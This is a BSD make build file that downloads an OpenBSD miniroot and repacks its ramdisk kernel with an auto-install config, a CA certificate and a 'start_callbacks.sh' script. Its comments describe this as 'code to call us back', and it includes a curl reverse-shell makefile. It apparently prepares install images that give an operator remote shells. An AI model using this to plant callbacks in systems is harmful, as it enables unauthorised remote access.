# build.mk.m4
# Build ALL the things, with less repetition
# By J. Stuart McMurray
# Created 20260110
# Last Modified 20260205

# Derived variables.
BSD             = ${TMPD}/bsd_${VERN}_${ARCH}
BSD_CRS         = ${TMPD}/bsd_${VERN}_${ARCH}_crs
DISK_IMAGE      = ${TMPD}/disk_${VERN}_${ARCH}.fs
DISK_IMAGE_CRS  = ${TMPD}/disk_${VERN}_${ARCH}_crs.fs
MINIROOT        = ${TMPD}/miniroot${VERN}_${ARCH}.img
MINIROOT_CRS    = miniroot${VERN}_${ARCH}_crs.img
VERN            = ${VERSION:S/.//}
SUBMAKES       != find * -name Makefile -mindepth 2 -type f

.include "src/mk/curlrevshell.mk"

# By default, build a miniroot install image.
build: ${MINIROOT_CRS} ${CRS_TXTAR} ${CRS_TMPL} ${OQA_BIN} ${START_SH}
.MAIN: build
.PHONY: build

# Miniroot image plus code to call us back.
CATORZIP = cat
.if "amd64" == ${ARCH}
CATORZIP = gzip -c
.endif
${MINIROOT_CRS}: ${MINIROOT} ${BSD_CRS}
	cp ${MINIROOT} $@.tmp
	m4_mount($@.tmp)
	${CATORZIP} ${BSD_CRS} >$@_dir/bsd
	m4_umount
	mv $@.tmp $@

# Ramdisk kernel plus code to call us back.
${BSD_CRS}: ${BSD} ${DISK_IMAGE_CRS}
	cp ${BSD} $@.tmp
	rdsetroot $@.tmp ${DISK_IMAGE_CRS}
	mv $@.tmp $@

# Ramdisk image plus code to call us back.
${DISK_IMAGE_CRS}: ${DISK_IMAGE}
${DISK_IMAGE_CRS}: auto_install.conf ${START_CALLBACKS} src/profile ${CRS_CERT}
	cp ${>:M*.fs} $@.tmp
	m4_mount($@.tmp)
	doas install -o root -g wheel -m 0444\
		auto_install.conf $@_dir/
	install -D -o root -g wheel -m 0444\
		${CRS_CERT} $@_dir/${CRS_CAFILE}
	install -D -o root -g wheel -m 0555\
		src/profile $@_dir/etc/profile
	install -D -o root -g wheel -m 0555\
		${START_CALLBACKS} $@_dir/usr/local/bin/start_callbacks.sh
	m4_umount
	mv $@.tmp $@

# Original ramdisk image from original ramdisk kernel.
${DISK_IMAGE}: ${BSD}
	rdsetroot -x $> $@

# Original ramdisk kernel.
${BSD}: ${MINIROOT}
	m4_mount($>, rdonly)
	gunzip -fc <$@_dir/bsd >$@.tmp
	m4_umount
	mv $@.tmp $@
	
# Original miniroot image.
${MINIROOT}:
	ftp -o $@.tmp -u ${MIRROR}/${VERSION}/${ARCH}/miniroot${VERN}.img
	mv $@.tmp $@

# Test things, which doesn't do much at the moment.
test:
.for D in ${SUBMAKES:H}
	${MAKE} -C $D $@
.endfor
.PHONY: test

# Unmount, unconfigure vnd devices, remove most intermediate built files.
clean:
.for D in ${SUBMAKES:H}
	${MAKE} -C $D $@
.endfor
	mount | egrep -o ${.CURDIR:Q}/'[^[:space:]]+' | while read -r; do\
		doas umount "$$REPLY";\
	done
	doas vnconfig -l | egrep ${.CURDIR:Q} | cut -f 1 -d : |\
		while read -r; do\
		doas vnconfig -u "$$REPLY";\
	done
	! [[ -d ${TMPD} ]] || find\
		${TMPD}\
		\! -name crs_cert.pem\
		\! -name crs_key.pem\
		\! -name 'miniroot*.img'\
		\! -path ${BUILD_MK}\
		-delete
.PHONY: clean

# Remove the downloaded miniroots as well.
distclean: clean
.for D in ${SUBMAKES:H}
	${MAKE} -C $D $@
.endfor
	rm -rf\
		${START_SH}\
		${OQA_BIN}\
		${TMPD}\
		crs.*\
		miniroot*
.PHONY: distclean

# vim: ft=make
